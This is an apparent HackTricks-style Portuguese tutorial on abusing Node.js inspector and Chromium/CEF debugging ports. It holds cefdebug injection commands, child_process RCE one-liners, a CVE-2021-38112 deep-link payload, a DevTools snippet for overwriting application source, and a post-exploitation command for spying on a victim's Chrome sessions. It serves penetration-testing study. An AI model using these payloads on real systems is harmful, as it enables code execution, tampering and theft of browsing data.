# Abuso do debug do Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

[Da documentação](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de debugging. Por **padrão**, ele escutará no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **único**.<sup>[[4]](#references)</sup>

Os clientes do Inspector precisam conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa terá uma aparência semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta poderá executar código arbitrário em nome do processo Node.js (**potencial escalação de privilégios**).

Há várias maneiras de iniciar um Inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando você inicia um processo inspecionado, algo assim aparecerá:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processos baseados em **CEF** (**Chromium Embedded Framework**) precisam usar o parâmetro: `--remote-debugging-port=9222` para abrir o **debugger** (as proteções contra SSRF permanecem muito semelhantes). No entanto, **em vez de** conceder uma sessão de **debug** do **NodeJS**, eles se comunicarão com o navegador usando o [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), uma interface para controlar o navegador, mas não há um RCE direto.<sup>[[5]](#references)</sup>

Quando você inicia um navegador em modo de debug, algo como isto aparecerá:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets e same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Os sites abertos em um navegador web podem fazer requisições WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um id exclusivo da sessão do debugger**. A **same-origin-policy** **impede** que os sites possam fazer **essa conexão HTTP**. Para obter segurança adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **headers 'Host'** da conexão especificam precisamente um **endereço IP**, **`localhost`** ou **`localhost6`**.<sup>[[12]](#references)</sup>

> [!TIP]
> Essa **medida de segurança impede a exploração do inspector** para executar código **apenas enviando uma requisição HTTP** (o que poderia ser feito explorando uma vulnerabilidade de SSRF).

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes; portanto, isso pode conceder **acesso privilegiado a informações dentro do processo**, mas não uma escalação direta de privilégios.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.

### Conectar ao inspector/debugger

Para conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas no Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):

![Após uma URL para acessar o debugger aparecerá. por exemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para conectar a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode conectar-se a um debugger/inspector com:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectors** em execução localmente e **injetar código** neles.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Note que exploits de **RCE** em **NodeJS** não funcionarão se conectados a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (você precisa verificar a API para encontrar coisas interessantes a fazer com ele).

## RCE no Debugger/Inspector do NodeJS

> [!TIP]
> Se você chegou aqui procurando saber como obter [**RCE a partir de um XSS no Electron, consulte esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando você pode **conectar-se** a um **inspector** do Node são usando algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
Nesta seção, vou apenas listar coisas interessantes que encontrei que foram usadas para explorar este protocolo.

### Parameter Injection via Deep Links

No [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que uma aplicação baseada em CEF **registrou uma URI personalizada** no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava a aplicação baseada em CEF** com uma configuração parcialmente construída a partir dessa URI.<sup>[[8]](#references)</sup>

Foi descoberto que os parâmetros da URI eram decodificados por URL e usados para iniciar a aplicação básica baseada em CEF, permitindo que um usuário fizesse **inject** da flag **`--gpu-launcher`** na **command line** e executasse ações arbitrárias.

Assim, um payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Executará um calc.exe.

### Sobrescrever arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** frequentemente usado pelo aplicativo com seu **código malicioso**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### RCE e exfiltration via Webdriver

De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), é possível obter RCE e fazer exfiltration de páginas internas do theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um browser baseado em Chrome/Chromium, você poderia iniciar um processo do Chrome com o **debugging ativado e fazer port-forward da porta de debugging** para poder acessá-lo. Dessa forma, você poderá **inspecionar tudo o que a vítima faz com o Chrome e roubar informações sensíveis**.<sup>[[7]](#references)</sup>

A maneira stealth é **encerrar todos os processos do Chrome** e então chamar algo como
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Referências

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
